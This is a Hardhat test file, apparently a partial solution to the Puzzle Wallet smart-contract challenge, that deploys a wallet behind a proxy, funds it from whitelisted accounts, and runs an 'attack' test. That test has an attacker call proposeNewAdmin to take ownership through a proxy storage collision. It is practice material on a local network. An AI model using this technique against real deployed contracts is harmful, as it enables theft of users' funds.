import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

const { provider, utils } = ethers;

const MAX_BALANCE = utils.parseEther('100');

describe('PuzzleWallet', () => {
  let owner: SignerWithAddress;
  let admin: SignerWithAddress;
  let friend1: SignerWithAddress;
  let friend2: SignerWithAddress;
  let friend3: SignerWithAddress;
  let attacker: SignerWithAddress;
  let contract: Contract;

  before(async () => {
    [owner, admin, friend1, friend2, friend3, attacker] =
      await ethers.getSigners();

    const PuzzleWalletFactory = await ethers.getContractFactory('PuzzleWallet');

    console.log(PuzzleWalletFactory.interface);

    const puzzleWallet = await PuzzleWalletFactory.deploy();
    await puzzleWallet.deployed();

    const iface = new ethers.utils.Interface(['function init(uint256)']);
    const data = iface.encodeFunctionData('init', [MAX_BALANCE]);

    const PuzzleProxyFactory = await ethers.getContractFactory('PuzzleProxy');
    const puzzleProxy = await PuzzleProxyFactory.deploy(
      admin.address,
      puzzleWallet.address,
      data
    );
    await puzzleProxy.deployed();

    contract = PuzzleWalletFactory.attach(puzzleProxy.address);
    let [tx1, tx2, tx3] = await Promise.all([
      contract.addToWhitelist(friend1.address),
      contract.addToWhitelist(friend2.address),
      contract.addToWhitelist(friend3.address),
    ]);
    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait()]);

    [tx1, tx2, tx3] = await Promise.all([
      contract.connect(friend1).deposit({
        value: utils.parseEther('1'),
      }),
      contract.connect(friend2).deposit({
        value: utils.parseEther('5'),
      }),
      contract.connect(friend3).deposit({
        value: utils.parseEther('10'),
      }),
    ]);
    await Promise.all([tx1.wait(), tx2.wait(), tx3.wait()]);
  });

  it('attack', async () => {
    console.log(await provider.getBalance(contract.address));

    let tx = await contract.connect(attacker).proposeNewAdmin(attacker.address);
    await tx.wait();

    console.log(attacker.address);
    console.log(await contract.owner());

    expect(true).to.equal(false);
  });
});
